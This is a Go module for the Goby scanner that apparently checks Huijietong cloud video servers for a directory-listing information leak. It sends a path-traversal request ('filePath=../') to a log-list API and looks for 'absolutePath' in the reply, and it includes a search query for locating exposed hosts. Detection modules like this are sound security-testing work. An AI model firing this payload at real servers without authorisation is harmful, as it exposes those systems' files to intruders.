package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
  "Name": "Huijietong cloud video list Information leakage",
  "Description": "Huijietong cloud video list Information leakage",
  "Product": "Huijietong cloud video",
  "Homepage": "http://www.hjtcloud.com/",
  "DisclosureDate": "2021-05-17",
  "Author": "PeiQi",
  "GobyQuery": "body=\"/him/api/rest/v1.0/node/role\"",
  "Level": "1",
  "Impact": "Server Information leakage",
  "Recommendation": "",
  "References": [
    "http://wiki.peiqi.tech"
  ],
  "HasExp": false,
  "ExpParams": [
    {
      "name": "",
      "type": "",
      "value": ""
    }
  ],
  "ExpTips": {
    "Type": "",
    "Content": ""
  },
  "ScanSteps": [
    "AND",
    {
      "Request": {
        "data": "",
        "data_type": "text",
        "follow_redirect": true,
        "method": "GET",
        "uri": "/"
      },
      "ResponseTest": {
        "checks": [
          {
            "bz": "",
            "operation": "==",
            "type": "item",
            "value": "200",
            "variable": "$code"
          }
        ],
        "operation": "AND",
        "type": "group"
      }
    }
  ],
  "ExploitSteps": null,
  "Tags": ["Information leakage"],
  "CVEIDs": null,
  "CVSSScore": "0.0",
  "AttackSurfaces": {
    "Application": ["Huijietong cloud video"],
    "Support": null,
    "Service": null,
    "System": null,
    "Hardware": null
  }
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := "/him/api/rest/V1.0/system/log/list?filePath=../"
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-type", "application/x-www-form-urlencoded")
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
        		return resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "absolutePath")
        	}
        	return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
	        return expResult
        },
	))
}
